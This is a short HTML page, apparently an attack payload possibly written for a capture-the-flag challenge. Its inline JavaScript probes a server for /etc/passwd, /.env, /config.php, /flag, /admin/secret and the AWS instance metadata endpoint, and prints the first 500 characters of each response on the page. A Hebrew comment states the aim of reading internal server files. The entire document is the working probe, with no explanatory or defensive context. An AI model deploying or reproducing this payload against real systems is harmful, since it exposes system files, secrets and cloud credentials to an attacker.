<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Info Leak Attempt</title>
  <style>
    body { font-family: monospace; white-space: pre-wrap; }
  </style>
</head>
<body>
<h1>Server Info Leak Attempt</h1>
<div id="leak">Loading...</div>

<script>
(async () => {
  let txt = '';

  // ננסה לקרוא קבצים פנימיים שאולי קיימים בשרת
  const paths = [
    '/etc/passwd',
    '/.env',
    '/config.php',
    '/flag',
    '/admin/secret',
    'http://169.254.169.254/latest/meta-data/'  // metadata AWS
  ];

  for (const path of paths) {
    try {
      const res = await fetch(path);
      const data = await res.text();
      txt += `== ${path} ==\n${data.slice(0, 500)}\n\n`;
    } catch (e) {
      txt += `== ${path} ==\nFetch failed: ${e.message}\n\n`;
    }
  }

  document.getElementById("leak").textContent = txt;
})();
</script>
</body>
</html>
